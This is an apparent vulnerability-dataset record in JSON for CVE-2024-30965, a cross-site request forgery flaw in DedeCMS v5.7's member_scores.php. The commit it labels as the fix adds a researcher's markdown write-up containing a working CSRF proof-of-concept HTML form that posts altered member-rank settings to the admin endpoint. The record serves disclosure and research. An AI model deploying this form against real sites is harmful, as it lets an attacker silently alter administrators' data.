{
  "cve_id": "CVE-2024-30965",
  "github_data": {
    "repository": "Fishkey1/cms",
    "fix_commit": "e9d294951ab2dd85709f1d12ad4747f25d326b1b",
    "related_commits": [
      "e9d294951ab2dd85709f1d12ad4747f25d326b1b",
      "e9d294951ab2dd85709f1d12ad4747f25d326b1b"
    ],
    "patch_url": null,
    "fix_commit_details": {
      "sha": "e9d294951ab2dd85709f1d12ad4747f25d326b1b",
      "commit_date": "2024-03-23T11:12:16Z",
      "author": {
        "login": "Fishkey1",
        "type": "User",
        "stats": null
      },
      "commit_message": {
        "title": "Create 1.md",
        "length": 11,
        "has_description": false,
        "references_issue": false
      },
      "stats": {
        "total": 81,
        "additions": 81,
        "deletions": 0
      },
      "files": [
        {
          "filename": "1.md",
          "status": "added",
          "additions": 81,
          "deletions": 0,
          "patch": "@@ -0,0 +1,81 @@\n+target:https://github.com/wdsunwq/DedeCMSv5\n+version: v5.7\n+\n+DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /src/dede/member_scores.php\n+![1](https://github.com/Fishkey1/cms/assets/164625271/8b909b5c-a852-404f-90bb-23f97d296174)\n+\n+Poc:\n+\n+```\n+<html>\n+  <!-- CSRF PoC - generated by Burp Suite Professional -->\n+  <body>\n+  <script>history.pushState('', '', '/')</script>\n+    <form action=\"http://127.0.0.1/src/dede/member_scores.php\" method=\"POST\">\n+      <input type=\"hidden\" name=\"action\" value=\"save\" />\n+      <input type=\"hidden\" name=\"integral&#45;2\" value=\"0\" />\n+      <input type=\"hidden\" name=\"icon&#45;2\" value=\"1\" />\n+      <input type=\"hidden\" name=\"titles&#45;2\" value=\"\ufffd&#136;&#151;\ufffd&#133;\ufffd\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;2\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;3\" value=\"1000\" />\n+      <input type=\"hidden\" name=\"icon&#45;3\" value=\"2\" />\n+      <input type=\"hidden\" name=\"titles&#45;3\" value=\"\ufffd&#143;&#173;\ufffd&#149;&#191;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;3\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;4\" value=\"2000\" />\n+      <input type=\"hidden\" name=\"icon&#45;4\" value=\"3\" />\n+      <input type=\"hidden\" name=\"titles&#45;4\" value=\"\ufffd&#176;&#145;\ufffd&#176;&#137;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;4\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;5\" value=\"3000\" />\n+      <input type=\"hidden\" name=\"icon&#45;5\" value=\"4\" />\n+      <input type=\"hidden\" name=\"titles&#45;5\" value=\"\ufffd&#184;&#173;\ufffd&#176;&#137;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;5\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;6\" value=\"4000\" />\n+      <input type=\"hidden\" name=\"icon&#45;6\" value=\"5\" />\n+      <input type=\"hidden\" name=\"titles&#45;6\" value=\"\ufffd&#184;&#138;\ufffd&#176;&#137;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;6\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;7\" value=\"5000\" />\n+      <input type=\"hidden\" name=\"icon&#45;7\" value=\"6\" />\n+      <input type=\"hidden\" name=\"titles&#45;7\" value=\"\ufffd&#176;&#145;\ufffd&#160;&#161;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;7\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;8\" value=\"6000\" />\n+      <input type=\"hidden\" name=\"icon&#45;8\" value=\"7\" />\n+      <input type=\"hidden\" name=\"titles&#45;8\" value=\"\ufffd&#184;&#173;\ufffd&#160;&#161;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;8\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;9\" value=\"9000\" />\n+      <input type=\"hidden\" name=\"icon&#45;9\" value=\"8\" />\n+      <input type=\"hidden\" name=\"titles&#45;9\" value=\"\ufffd&#184;&#138;\ufffd&#160;&#161;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;9\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;10\" value=\"14000\" />\n+      <input type=\"hidden\" name=\"icon&#45;10\" value=\"9\" />\n+      <input type=\"hidden\" name=\"titles&#45;10\" value=\"\ufffd&#176;&#145;\ufffd&#176;&#134;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;10\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;11\" value=\"19000\" />\n+      <input type=\"hidden\" name=\"icon&#45;11\" value=\"10\" />\n+      <input type=\"hidden\" name=\"titles&#45;11\" value=\"\ufffd&#184;&#173;\ufffd&#176;&#134;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;11\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;12\" value=\"24000\" />\n+      <input type=\"hidden\" name=\"icon&#45;12\" value=\"11\" />\n+      <input type=\"hidden\" name=\"titles&#45;12\" value=\"\ufffd&#184;&#138;\ufffd&#176;&#134;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;12\" value=\"1\" />\n+      <input type=\"hidden\" name=\"integral&#45;15\" value=\"29000\" />\n+      <input type=\"hidden\" name=\"icon&#45;15\" value=\"12\" />\n+      <input type=\"hidden\" name=\"titles&#45;15\" value=\"\ufffd&#164;&#167;\ufffd&#176;&#134;\" />\n+      <input type=\"hidden\" name=\"isdefault&#45;15\" value=\"1\" />\n+      <input type=\"hidden\" name=\"add&#95;integral\" value=\"\" />\n+      <input type=\"hidden\" name=\"add&#95;icon\" value=\"\" />\n+      <input type=\"hidden\" name=\"add&#95;titles\" value=\"\" />\n+      <input type=\"hidden\" name=\"add&#95;isdefault\" value=\"1\" />\n+      <input type=\"hidden\" name=\"imageField\" value=\"\ufffd&#143;&#144;\u6d5c&#164;\" />\n+      <input type=\"submit\" value=\"Submit request\" />\n+    </form>\n+  </body>\n+</html>\n+\n+```\n+![2](https://github.com/Fishkey1/cms/assets/164625271/0b369563-4226-4bc6-8075-6fc836dcb156)\n+\n+\n+\n+successed\n+\n+![3](https://github.com/Fishkey1/cms/assets/164625271/feb0c762-0a1b-4748-a477-5bb63358a1a5)"
        }
      ],
      "file_patterns": {
        "security_files": 0,
        "config_files": 0,
        "dependency_files": 0,
        "test_files": 0,
        "unique_directories": 1,
        "max_directory_depth": 0
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "aaabd4447da30d306507eb4ad084d540de094705",
            "date": "2024-04-07T07:29:15Z",
            "author_login": "Fishkey1"
          },
          {
            "sha": "e9d294951ab2dd85709f1d12ad4747f25d326b1b",
            "date": "2024-03-23T11:12:16Z",
            "author_login": "Fishkey1"
          },
          {
            "sha": "7c381578899ae947e2765a3d17517d3dc000cb17",
            "date": "2024-03-23T11:08:57Z",
            "author_login": "Fishkey1"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "cwe_id": "CWE-352",
    "description": "DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability via /src/dede/member_scores.php.",
    "attack_vector": "NETWORK",
    "attack_complexity": "LOW"
  },
  "temporal_data": {
    "published_date": "2024-04-02T14:15:08.260",
    "last_modified": "2024-11-21T09:12:38.480",
    "fix_date": "2024-03-23T11:12:16Z"
  },
  "references": [
    {
      "url": "https://github.com/Fishkey1/cms/commit/e9d294951ab2dd85709f1d12ad4747f25d326b1b",
      "source": "cve@mitre.org",
      "tags": []
    },
    {
      "url": "https://github.com/Fishkey1/cms/tree/main",
      "source": "cve@mitre.org",
      "tags": []
    },
    {
      "url": "https://github.com/Fishkey1/cms/commit/e9d294951ab2dd85709f1d12ad4747f25d326b1b",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://github.com/Fishkey1/cms/tree/main",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:07:52.943738",
    "processing_status": "enhanced"
  }
}